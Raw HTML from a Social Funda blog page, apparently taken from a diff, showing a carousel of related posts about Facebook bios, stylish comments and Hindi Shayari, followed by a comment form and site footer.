+				<img width="300" height="169" src="https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2-300x169.webp" class="attachment-medium size-medium wp-post-image" alt="1000+ Best Facebook VIP Bio | Facebook VIP Account Bio-2024" decoding="async" loading="lazy" srcset="https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2-300x169.webp 300w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2-1024x576.webp 1024w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2-768x432.webp 768w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2-1536x864.webp 1536w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-vip-bio-2.webp 1920w" sizes="auto, (max-width: 300px) 100vw, 300px" />			</div>
+		</a><!-- .post-thumbnail -->
+			<div class="entry-content-wrap">
+		<header class="entry-header">
+
+			<div class="entry-taxonomies">
+			<span class="category-links term-links category-style-normal">
+				<a href="https://socialfunda.net/facebook-bios/" rel="tag" data-wpel-link="internal">Facebook Bios</a>			</span>
+		</div><!-- .entry-taxonomies -->
+		<h3 class="entry-title"><a href="https://socialfunda.net/facebook-vip-bio/" rel="bookmark" data-wpel-link="internal">1000+ Best Facebook VIP Bio | Facebook VIP Account Bio-2024</a></h3><div class="entry-meta entry-meta-divider-customicon">
+	<span class="posted-by"><span class="meta-label">By</span><span class="author vcard"><a class="url fn n" href="https://socialfunda.net" data-wpel-link="internal">Socialfunda</a></span></span>					<span class="posted-on">
+						<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-hours-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Hours</title><path d="M23 12c0-3.037-1.232-5.789-3.222-7.778s-4.741-3.222-7.778-3.222-5.789 1.232-7.778 3.222-3.222 4.741-3.222 7.778 1.232 5.789 3.222 7.778 4.741 3.222 7.778 3.222 5.789-1.232 7.778-3.222 3.222-4.741 3.222-7.778zM21 12c0 2.486-1.006 4.734-2.636 6.364s-3.878 2.636-6.364 2.636-4.734-1.006-6.364-2.636-2.636-3.878-2.636-6.364 1.006-4.734 2.636-6.364 3.878-2.636 6.364-2.636 4.734 1.006 6.364 2.636 2.636 3.878 2.636 6.364zM11 6v6c0 0.389 0.222 0.727 0.553 0.894l4 2c0.494 0.247 1.095 0.047 1.342-0.447s0.047-1.095-0.447-1.342l-3.448-1.723v-5.382c0-0.552-0.448-1-1-1s-1 0.448-1 1z"></path>
+				</svg></span><time class="entry-date published" datetime="2023-02-12T23:31:03+00:00">February 12, 2023</time><time class="updated" datetime="2024-01-07T15:34:59+00:00">January 7, 2024</time>					</span>
+					</div><!-- .entry-meta -->
+</header><!-- .entry-header -->
+	<div class="entry-summary">
+		<p>Here, you will find a mind-blowing Facebook VIP bio for girls &#038; boys. Copy your favorite Facebook VIP bio and paste it on your Facebook profile.</p>
+	</div><!-- .entry-summary -->
+	<footer class="entry-footer">
+		<div class="entry-actions">
+		<p class="more-link-wrap">
+			<a href="https://socialfunda.net/facebook-vip-bio/" class="post-more-link" data-wpel-link="internal">
+				Read More<span class="screen-reader-text"> 1000+ Best Facebook VIP Bio | Facebook VIP Account Bio-2024</span><span class="kadence-svg-iconset svg-baseline"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-right-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="27" height="28" viewBox="0 0 27 28"><title>Continue</title><path d="M27 13.953c0 0.141-0.063 0.281-0.156 0.375l-6 5.531c-0.156 0.141-0.359 0.172-0.547 0.094-0.172-0.078-0.297-0.25-0.297-0.453v-3.5h-19.5c-0.281 0-0.5-0.219-0.5-0.5v-3c0-0.281 0.219-0.5 0.5-0.5h19.5v-3.5c0-0.203 0.109-0.375 0.297-0.453s0.391-0.047 0.547 0.078l6 5.469c0.094 0.094 0.156 0.219 0.156 0.359v0z"></path>
+				</svg></span>			</a>
+		</p>
+	</div><!-- .entry-actions -->
+	</footer><!-- .entry-footer -->
+	</div>
+</article>
+</div><div class="carousel-item splide__slide">
+<article class="entry content-bg loop-entry post-121 post type-post status-publish format-standard has-post-thumbnail hentry category-facebook-bios">
+			<a class="post-thumbnail kadence-thumbnail-ratio-9-16" href="https://socialfunda.net/facebook-bio-for-girls/" data-wpel-link="internal">
+			<div class="post-thumbnail-inner">
+				<img width="300" height="169" src="https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls-300x169.webp" class="attachment-medium size-medium wp-post-image" alt="Best 1100+ Facebook Bio for Girls-2024" decoding="async" loading="lazy" srcset="https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls-300x169.webp 300w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls-1024x576.webp 1024w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls-768x432.webp 768w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls-1536x864.webp 1536w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-for-girls.webp 1920w" sizes="auto, (max-width: 300px) 100vw, 300px" />			</div>
+		</a><!-- .post-thumbnail -->
+			<div class="entry-content-wrap">
+		<header class="entry-header">
+
+			<div class="entry-taxonomies">
+			<span class="category-links term-links category-style-normal">
+				<a href="https://socialfunda.net/facebook-bios/" rel="tag" data-wpel-link="internal">Facebook Bios</a>			</span>
+		</div><!-- .entry-taxonomies -->
+		<h3 class="entry-title"><a href="https://socialfunda.net/facebook-bio-for-girls/" rel="bookmark" data-wpel-link="internal">Best 1100+ Facebook Bio for Girls-2024</a></h3><div class="entry-meta entry-meta-divider-customicon">
+	<span class="posted-by"><span class="meta-label">By</span><span class="author vcard"><a class="url fn n" href="https://socialfunda.net" data-wpel-link="internal">Socialfunda</a></span></span>					<span class="posted-on">
+						<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-hours-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Hours</title><path d="M23 12c0-3.037-1.232-5.789-3.222-7.778s-4.741-3.222-7.778-3.222-5.789 1.232-7.778 3.222-3.222 4.741-3.222 7.778 1.232 5.789 3.222 7.778 4.741 3.222 7.778 3.222 5.789-1.232 7.778-3.222 3.222-4.741 3.222-7.778zM21 12c0 2.486-1.006 4.734-2.636 6.364s-3.878 2.636-6.364 2.636-4.734-1.006-6.364-2.636-2.636-3.878-2.636-6.364 1.006-4.734 2.636-6.364 3.878-2.636 6.364-2.636 4.734 1.006 6.364 2.636 2.636 3.878 2.636 6.364zM11 6v6c0 0.389 0.222 0.727 0.553 0.894l4 2c0.494 0.247 1.095 0.047 1.342-0.447s0.047-1.095-0.447-1.342l-3.448-1.723v-5.382c0-0.552-0.448-1-1-1s-1 0.448-1 1z"></path>
+				</svg></span><time class="entry-date published" datetime="2023-02-14T11:17:26+00:00">February 14, 2023</time><time class="updated" datetime="2024-01-02T06:49:30+00:00">January 2, 2024</time>					</span>
+					</div><!-- .entry-meta -->
+</header><!-- .entry-header -->
+	<div class="entry-summary">
+		<p>Girls.👮‍♀️, vist this post to get a special collection of lastest, stylish, attitude,cool and facebook bio for Girls to upgrade your facebook profile.</p>
+	</div><!-- .entry-summary -->
+	<footer class="entry-footer">
+		<div class="entry-actions">
+		<p class="more-link-wrap">
+			<a href="https://socialfunda.net/facebook-bio-for-girls/" class="post-more-link" data-wpel-link="internal">
+				Read More<span class="screen-reader-text"> Best 1100+ Facebook Bio for Girls-2024</span><span class="kadence-svg-iconset svg-baseline"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-right-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="27" height="28" viewBox="0 0 27 28"><title>Continue</title><path d="M27 13.953c0 0.141-0.063 0.281-0.156 0.375l-6 5.531c-0.156 0.141-0.359 0.172-0.547 0.094-0.172-0.078-0.297-0.25-0.297-0.453v-3.5h-19.5c-0.281 0-0.5-0.219-0.5-0.5v-3c0-0.281 0.219-0.5 0.5-0.5h19.5v-3.5c0-0.203 0.109-0.375 0.297-0.453s0.391-0.047 0.547 0.078l6 5.469c0.094 0.094 0.156 0.219 0.156 0.359v0z"></path>
+				</svg></span>			</a>
+		</p>
+	</div><!-- .entry-actions -->
+	</footer><!-- .entry-footer -->
+	</div>
+</article>
+</div><div class="carousel-item splide__slide">
+<article class="entry content-bg loop-entry post-179 post type-post status-publish format-standard has-post-thumbnail hentry category-facebook-bios">
+			<a class="post-thumbnail kadence-thumbnail-ratio-9-16" href="https://socialfunda.net/facebook-bio-style/" data-wpel-link="internal">
+			<div class="post-thumbnail-inner">
+				<img width="300" height="169" src="https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles-300x169.webp" class="attachment-medium size-medium wp-post-image" alt="Best 300+ Facebook Bio Style-2024" decoding="async" loading="lazy" srcset="https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles-300x169.webp 300w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles-1024x576.webp 1024w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles-768x432.webp 768w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles-1536x864.webp 1536w, https://socialfunda.net/wp-content/uploads/2023/02/facebook-bio-styles.webp 1920w" sizes="auto, (max-width: 300px) 100vw, 300px" />			</div>
+		</a><!-- .post-thumbnail -->
+			<div class="entry-content-wrap">
+		<header class="entry-header">
+
+			<div class="entry-taxonomies">
+			<span class="category-links term-links category-style-normal">
+				<a href="https://socialfunda.net/facebook-bios/" rel="tag" data-wpel-link="internal">Facebook Bios</a>			</span>
+		</div><!-- .entry-taxonomies -->
+		<h3 class="entry-title"><a href="https://socialfunda.net/facebook-bio-style/" rel="bookmark" data-wpel-link="internal">Best 300+ Facebook Bio Style-2024</a></h3><div class="entry-meta entry-meta-divider-customicon">
+	<span class="posted-by"><span class="meta-label">By</span><span class="author vcard"><a class="url fn n" href="https://socialfunda.net" data-wpel-link="internal">Socialfunda</a></span></span>					<span class="posted-on">
+						<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-hours-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Hours</title><path d="M23 12c0-3.037-1.232-5.789-3.222-7.778s-4.741-3.222-7.778-3.222-5.789 1.232-7.778 3.222-3.222 4.741-3.222 7.778 1.232 5.789 3.222 7.778 4.741 3.222 7.778 3.222 5.789-1.232 7.778-3.222 3.222-4.741 3.222-7.778zM21 12c0 2.486-1.006 4.734-2.636 6.364s-3.878 2.636-6.364 2.636-4.734-1.006-6.364-2.636-2.636-3.878-2.636-6.364 1.006-4.734 2.636-6.364 3.878-2.636 6.364-2.636 4.734 1.006 6.364 2.636 2.636 3.878 2.636 6.364zM11 6v6c0 0.389 0.222 0.727 0.553 0.894l4 2c0.494 0.247 1.095 0.047 1.342-0.447s0.047-1.095-0.447-1.342l-3.448-1.723v-5.382c0-0.552-0.448-1-1-1s-1 0.448-1 1z"></path>
+				</svg></span><time class="entry-date published" datetime="2023-02-15T13:30:00+00:00">February 15, 2023</time><time class="updated" datetime="2024-01-02T06:49:15+00:00">January 2, 2024</time>					</span>
+					</div><!-- .entry-meta -->
+</header><!-- .entry-header -->
+	<div class="entry-summary">
+		<p>Are you looking for a Facebook bio style, Facebook VIP bio stylish 2024, VIP bio styles, or Facebook styles work? If yes then follow this post till the end.</p>
+	</div><!-- .entry-summary -->
+	<footer class="entry-footer">
+		<div class="entry-actions">
+		<p class="more-link-wrap">
+			<a href="https://socialfunda.net/facebook-bio-style/" class="post-more-link" data-wpel-link="internal">
+				Read More<span class="screen-reader-text"> Best 300+ Facebook Bio Style-2024</span><span class="kadence-svg-iconset svg-baseline"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-right-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="27" height="28" viewBox="0 0 27 28"><title>Continue</title><path d="M27 13.953c0 0.141-0.063 0.281-0.156 0.375l-6 5.531c-0.156 0.141-0.359 0.172-0.547 0.094-0.172-0.078-0.297-0.25-0.297-0.453v-3.5h-19.5c-0.281 0-0.5-0.219-0.5-0.5v-3c0-0.281 0.219-0.5 0.5-0.5h19.5v-3.5c0-0.203 0.109-0.375 0.297-0.453s0.391-0.047 0.547 0.078l6 5.469c0.094 0.094 0.156 0.219 0.156 0.359v0z"></path>
+				</svg></span>			</a>
+		</p>
+	</div><!-- .entry-actions -->
+	</footer><!-- .entry-footer -->
+	</div>
+</article>
+</div><div class="carousel-item splide__slide">
+<article class="entry content-bg loop-entry post-234 post type-post status-publish format-standard has-post-thumbnail hentry category-facebook-bios">
+			<a class="post-thumbnail kadence-thumbnail-ratio-9-16" href="https://socialfunda.net/fb-stylish-comments-for-girls-and-boys/" data-wpel-link="internal">
+			<div class="post-thumbnail-inner">
+				<img width="300" height="206" src="https://socialfunda.net/wp-content/uploads/2023/02/Facebook-Stylish-Comments-300x206.webp" class="attachment-medium size-medium wp-post-image" alt="New 800+ Stylish Comment for Facebook-2024" decoding="async" loading="lazy" srcset="https://socialfunda.net/wp-content/uploads/2023/02/Facebook-Stylish-Comments-300x206.webp 300w, https://socialfunda.net/wp-content/uploads/2023/02/Facebook-Stylish-Comments-768x528.webp 768w, https://socialfunda.net/wp-content/uploads/2023/02/Facebook-Stylish-Comments.webp 960w" sizes="auto, (max-width: 300px) 100vw, 300px" />			</div>
+		</a><!-- .post-thumbnail -->
+			<div class="entry-content-wrap">
+		<header class="entry-header">
+
+			<div class="entry-taxonomies">
+			<span class="category-links term-links category-style-normal">
+				<a href="https://socialfunda.net/facebook-bios/" rel="tag" data-wpel-link="internal">Facebook Bios</a>			</span>
+		</div><!-- .entry-taxonomies -->
+		<h3 class="entry-title"><a href="https://socialfunda.net/fb-stylish-comments-for-girls-and-boys/" rel="bookmark" data-wpel-link="internal">New 800+ Stylish Comment for Facebook-2024</a></h3><div class="entry-meta entry-meta-divider-customicon">
+	<span class="posted-by"><span class="meta-label">By</span><span class="author vcard"><a class="url fn n" href="https://socialfunda.net" data-wpel-link="internal">Socialfunda</a></span></span>					<span class="posted-on">
+						<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-hours-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Hours</title><path d="M23 12c0-3.037-1.232-5.789-3.222-7.778s-4.741-3.222-7.778-3.222-5.789 1.232-7.778 3.222-3.222 4.741-3.222 7.778 1.232 5.789 3.222 7.778 4.741 3.222 7.778 3.222 5.789-1.232 7.778-3.222 3.222-4.741 3.222-7.778zM21 12c0 2.486-1.006 4.734-2.636 6.364s-3.878 2.636-6.364 2.636-4.734-1.006-6.364-2.636-2.636-3.878-2.636-6.364 1.006-4.734 2.636-6.364 3.878-2.636 6.364-2.636 4.734 1.006 6.364 2.636 2.636 3.878 2.636 6.364zM11 6v6c0 0.389 0.222 0.727 0.553 0.894l4 2c0.494 0.247 1.095 0.047 1.342-0.447s0.047-1.095-0.447-1.342l-3.448-1.723v-5.382c0-0.552-0.448-1-1-1s-1 0.448-1 1z"></path>
+				</svg></span><time class="entry-date published" datetime="2023-02-20T03:50:14+00:00">February 20, 2023</time><time class="updated" datetime="2024-01-02T06:46:31+00:00">January 2, 2024</time>					</span>
+					</div><!-- .entry-meta -->
+</header><!-- .entry-header -->
+	<div class="entry-summary">
+		<p>Friends, here you will get an unlimited collection of the latest Stylish comments for fb for girls and boys in Hindi and English.</p>
+	</div><!-- .entry-summary -->
+	<footer class="entry-footer">
+		<div class="entry-actions">
+		<p class="more-link-wrap">
+			<a href="https://socialfunda.net/fb-stylish-comments-for-girls-and-boys/" class="post-more-link" data-wpel-link="internal">
+				Read More<span class="screen-reader-text"> New 800+ Stylish Comment for Facebook-2024</span><span class="kadence-svg-iconset svg-baseline"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-right-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="27" height="28" viewBox="0 0 27 28"><title>Continue</title><path d="M27 13.953c0 0.141-0.063 0.281-0.156 0.375l-6 5.531c-0.156 0.141-0.359 0.172-0.547 0.094-0.172-0.078-0.297-0.25-0.297-0.453v-3.5h-19.5c-0.281 0-0.5-0.219-0.5-0.5v-3c0-0.281 0.219-0.5 0.5-0.5h19.5v-3.5c0-0.203 0.109-0.375 0.297-0.453s0.391-0.047 0.547 0.078l6 5.469c0.094 0.094 0.156 0.219 0.156 0.359v0z"></path>
+				</svg></span>			</a>
+		</p>
+	</div><!-- .entry-actions -->
+	</footer><!-- .entry-footer -->
+	</div>
+</article>
+</div><div class="carousel-item splide__slide">
+<article class="entry content-bg loop-entry post-505 post type-post status-publish format-standard has-post-thumbnail hentry category-facebook-bios">
+			<a class="post-thumbnail kadence-thumbnail-ratio-9-16" href="https://socialfunda.net/facebook-shayari-in-hindi/" data-wpel-link="internal">
+			<div class="post-thumbnail-inner">
+				<img width="300" height="147" src="https://socialfunda.net/wp-content/uploads/2023/02/shayari-1-300x147.webp" class="attachment-medium size-medium wp-post-image" alt="Best Facebook Shayari in Hindi for Boys &#038; Girls-2024" decoding="async" loading="lazy" srcset="https://socialfunda.net/wp-content/uploads/2023/02/shayari-1-300x147.webp 300w, https://socialfunda.net/wp-content/uploads/2023/02/shayari-1-1024x502.webp 1024w, https://socialfunda.net/wp-content/uploads/2023/02/shayari-1-768x377.webp 768w, https://socialfunda.net/wp-content/uploads/2023/02/shayari-1.webp 1280w" sizes="auto, (max-width: 300px) 100vw, 300px" />			</div>
+		</a><!-- .post-thumbnail -->
+			<div class="entry-content-wrap">
+		<header class="entry-header">
+
+			<div class="entry-taxonomies">
+			<span class="category-links term-links category-style-normal">
+				<a href="https://socialfunda.net/facebook-bios/" rel="tag" data-wpel-link="internal">Facebook Bios</a>			</span>
+		</div><!-- .entry-taxonomies -->
+		<h3 class="entry-title"><a href="https://socialfunda.net/facebook-shayari-in-hindi/" rel="bookmark" data-wpel-link="internal">Best Facebook Shayari in Hindi for Boys &#038; Girls-2024</a></h3><div class="entry-meta entry-meta-divider-customicon">
+	<span class="posted-by"><span class="meta-label">By</span><span class="author vcard"><a class="url fn n" href="https://socialfunda.net" data-wpel-link="internal">Socialfunda</a></span></span>					<span class="posted-on">
+						<span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-hours-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Hours</title><path d="M23 12c0-3.037-1.232-5.789-3.222-7.778s-4.741-3.222-7.778-3.222-5.789 1.232-7.778 3.222-3.222 4.741-3.222 7.778 1.232 5.789 3.222 7.778 4.741 3.222 7.778 3.222 5.789-1.232 7.778-3.222 3.222-4.741 3.222-7.778zM21 12c0 2.486-1.006 4.734-2.636 6.364s-3.878 2.636-6.364 2.636-4.734-1.006-6.364-2.636-2.636-3.878-2.636-6.364 1.006-4.734 2.636-6.364 3.878-2.636 6.364-2.636 4.734 1.006 6.364 2.636 2.636 3.878 2.636 6.364zM11 6v6c0 0.389 0.222 0.727 0.553 0.894l4 2c0.494 0.247 1.095 0.047 1.342-0.447s0.047-1.095-0.447-1.342l-3.448-1.723v-5.382c0-0.552-0.448-1-1-1s-1 0.448-1 1z"></path>
+				</svg></span><time class="entry-date published" datetime="2023-02-23T02:00:00+00:00">February 23, 2023</time><time class="updated" datetime="2024-01-02T06:46:25+00:00">January 2, 2024</time>					</span>
+					</div><!-- .entry-meta -->
+</header><!-- .entry-header -->
+	<div class="entry-summary">
+		<p>Click here to get an unlimited collection  of Facebook Shayari, top Facebook attitude Shayari, layaway Shayari and gajab Shayari</p>
+	</div><!-- .entry-summary -->
+	<footer class="entry-footer">
+		<div class="entry-actions">
+		<p class="more-link-wrap">
+			<a href="https://socialfunda.net/facebook-shayari-in-hindi/" class="post-more-link" data-wpel-link="internal">
+				Read More<span class="screen-reader-text"> Best Facebook Shayari in Hindi for Boys &#038; Girls-2024</span><span class="kadence-svg-iconset svg-baseline"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-right-alt-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="27" height="28" viewBox="0 0 27 28"><title>Continue</title><path d="M27 13.953c0 0.141-0.063 0.281-0.156 0.375l-6 5.531c-0.156 0.141-0.359 0.172-0.547 0.094-0.172-0.078-0.297-0.25-0.297-0.453v-3.5h-19.5c-0.281 0-0.5-0.219-0.5-0.5v-3c0-0.281 0.219-0.5 0.5-0.5h19.5v-3.5c0-0.203 0.109-0.375 0.297-0.453s0.391-0.047 0.547 0.078l6 5.469c0.094 0.094 0.156 0.219 0.156 0.359v0z"></path>
+				</svg></span>			</a>
+		</p>
+	</div><!-- .entry-actions -->
+	</footer><!-- .entry-footer -->
+	</div>
+</article>
+</div>							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div><!-- .entry-author -->
+		<div id="comments" class="comments-area">
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/latest-facebook-stylish-bio/#respond" style="display:none;" data-wpel-link="internal">Cancel reply</a></small></h3><form action="https://socialfunda.net/wp-comments-post.php" method="post" id="commentform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment comment-form-float-label"><textarea id="comment" name="comment" placeholder="Leave a comment..." cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea><label class="float-label" for="comment">Comment <span class="required">*</span></label></p><div class="comment-input-wrap has-url-field"><p class="comment-form-author"><input aria-label="Name" id="author" name="author" type="text" placeholder="John Doe" value="" size="30" maxlength="245" aria-required='true' required='required' /><label class="float-label" for="author">Name <span class="required">*</span></label></p>
+<p class="comment-form-email"><input aria-label="Email" id="email" name="email" type="email" placeholder="john@example.com" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /><label class="float-label" for="email">Email <span class="required">*</span></label></p>
+<p class="comment-form-url"><input aria-label="Website" id="url" name="url" type="url" placeholder="https://www.example.com" value="" size="30" maxlength="200" /><label class="float-label" for="url">Website</label></p></div>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
+<div class="g-recaptcha" style="transform: scale(0.9); -webkit-transform: scale(0.9); transform-origin: 0 0; -webkit-transform-origin: 0 0;" data-sitekey="6Ldm7zosAAAAAAVyBUY1bfiFKrKm9HDIMvWQEIqF"></div><script src='https://www.google.com/recaptcha/api.js?ver=1.31' id='wpcaptcha-recaptcha-js'></script><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='76' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p></form>	</div><!-- #respond -->
+	</div><!-- #comments -->
+			</div>
+					</main><!-- #main -->
+			</div>
+</div><!-- #primary -->
+	</div><!-- #inner-wrap -->
+	<footer id="colophon" class="site-footer" role="contentinfo">
+	<div class="site-footer-wrap">
+		<div class="site-top-footer-wrap site-footer-row-container site-footer-focus-item site-footer-row-layout-fullwidth site-footer-row-tablet-layout-default site-footer-row-mobile-layout-default" data-section="kadence_customizer_footer_top">
+	<div class="site-footer-row-container-inner">
+				<div class="site-container">
+			<div class="site-top-footer-inner-wrap site-footer-row site-footer-row-columns-3 site-footer-row-column-layout-equal site-footer-row-tablet-column-layout-default site-footer-row-mobile-column-layout-row ft-ro-dir-row ft-ro-collapse-normal ft-ro-t-dir-default ft-ro-m-dir-default ft-ro-lstyle-plain">
+									<div class="site-footer-top-section-1 site-footer-section footer-section-inner-items-0">
+											</div>
+										<div class="site-footer-top-section-2 site-footer-section footer-section-inner-items-1">
+						<div class="footer-widget-area widget-area site-footer-focus-item footer-widget1 content-align-default content-tablet-align-default content-mobile-align-default content-valign-default content-tablet-valign-default content-mobile-valign-default" data-section="sidebar-widgets-footer1">
+	<div class="footer-widget-area-inner site-info-inner">
+		<section id="block-8" class="widget widget_block widget_search"><form role="search" method="get" action="https://socialfunda.net/" class="wp-block-search__button-outside wp-block-search__icon-button aligncenter wp-block-search"    ><label class="wp-block-search__label screen-reader-text" for="wp-block-search__input-1" >Search</label><div class="wp-block-search__inside-wrapper" ><input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="Search in webiste" value="" type="search" name="s" required /><button aria-label="Search" class="wp-block-search__button has-icon wp-element-button" type="submit" ><svg class="search-icon" viewBox="0 0 24 24" width="24" height="24">
+					<path d="M13 5c-3.3 0-6 2.7-6 6 0 1.4.5 2.7 1.3 3.7l-3.8 3.8 1.1 1.1 3.8-3.8c1 .8 2.3 1.3 3.7 1.3 3.3 0 6-2.7 6-6S16.3 5 13 5zm0 10.5c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5 4.5 2 4.5 4.5-2 4.5-4.5 4.5z"></path>
+				</svg></button></div></form></section>	</div>
+</div><!-- .footer-widget1 -->
+					</div>
+										<div class="site-footer-top-section-3 site-footer-section footer-section-inner-items-0">
+											</div>
+								</div>
+		</div>
+	</div>
+</div>
+<div class="site-middle-footer-wrap site-footer-row-container site-footer-focus-item site-footer-row-layout-fullwidth site-footer-row-tablet-layout-default site-footer-row-mobile-layout-default" data-section="kadence_customizer_footer_middle">
+	<div class="site-footer-row-container-inner">
+				<div class="site-container">
+			<div class="site-middle-footer-inner-wrap site-footer-row site-footer-row-columns-3 site-footer-row-column-layout-equal site-footer-row-tablet-column-layout-default site-footer-row-mobile-column-layout-row ft-ro-dir-column ft-ro-collapse-normal ft-ro-t-dir-default ft-ro-m-dir-default ft-ro-lstyle-plain">
+									<div class="site-footer-middle-section-1 site-footer-section footer-section-inner-items-2">
+						<div class="footer-widget-area widget-area site-footer-focus-item footer-widget2 content-align-default content-tablet-align-default content-mobile-align-default content-valign-bottom content-tablet-valign-default content-mobile-valign-default" data-section="sidebar-widgets-footer2">
+	<div class="footer-widget-area-inner site-info-inner">
+		<section id="block-21" class="widget widget_block widget_text">
+<p></p>
+</section><section id="block-47" class="widget widget_block widget_media_image"><div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><img loading="lazy" decoding="async" width="200" height="200" src="https://socialfunda.net/wp-content/uploads/2023/11/Socialfund.in_.webp" alt="Social Funda" class="wp-image-3203" style="aspect-ratio:1.3333333333333333;width:216px;height:auto" srcset="https://socialfunda.net/wp-content/uploads/2023/11/Socialfund.in_.webp 200w, https://socialfunda.net/wp-content/uploads/2023/11/Socialfund.in_-150x150.webp 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></figure>
+</div></section>	</div>
+</div><!-- .footer-widget2 -->
+<div class="footer-widget-area widget-area site-footer-focus-item footer-widget5 content-align-center content-tablet-align-default content-mobile-align-default content-valign-middle content-tablet-valign-default content-mobile-valign-default" data-section="sidebar-widgets-footer5">
+	<div class="footer-widget-area-inner site-info-inner">
+		<section id="block-42" class="widget widget_block"><style>.wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc, .wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc[data-kb-block="kb-adv-headingblock-42_573536-bc"]{text-align:center;font-style:normal;}.wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc[data-kb-block="kb-adv-headingblock-42_573536-bc"] mark.kt-highlight{font-style:normal;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;}.wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-headingblock-42_573536-bc[data-kb-block="kb-adv-headingblock-42_573536-bc"] img.kb-inline-image{width:150px;vertical-align:baseline;}</style>
+<p class="kt-adv-headingblock-42_573536-bc wp-block-kadence-advancedheading" data-kb-block="kb-adv-headingblock-42_573536-bc"><a href="https://socialfunda.net/" data-type="link" data-id="https://socialfunda.net/" data-wpel-link="internal">Social Funda</a> is the place where you will get content related to social media and current affairs. Facebook Vip bio, Instagram Vip bio and Captions.</p>
+</section>	</div>
+</div><!-- .footer-widget5 -->
+					</div>
+										<div class="site-footer-middle-section-2 site-footer-section footer-section-inner-items-1">
+						<div class="footer-widget-area widget-area site-footer-focus-item footer-widget3 content-align-default content-tablet-align-default content-mobile-align-default content-valign-default content-tablet-valign-default content-mobile-valign-default" data-section="sidebar-widgets-footer3">
+	<div class="footer-widget-area-inner site-info-inner">
+		<section id="nav_menu-3" class="widget widget_nav_menu"><h2 class="widget-title">Editors Pic</h2><div class="collapse-sub-navigation"><ul id="menu-nav_menu-3" class="menu has-collapse-sub-nav"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-768"><a href="https://socialfunda.net/" data-wpel-link="internal">Home</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-30"><a href="https://socialfunda.net/facebook-bios/" data-wpel-link="internal">Facebook Bios</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-970"><a href="https://socialfunda.net/insta-bios/" data-wpel-link="internal">Insta Bios</a></li>
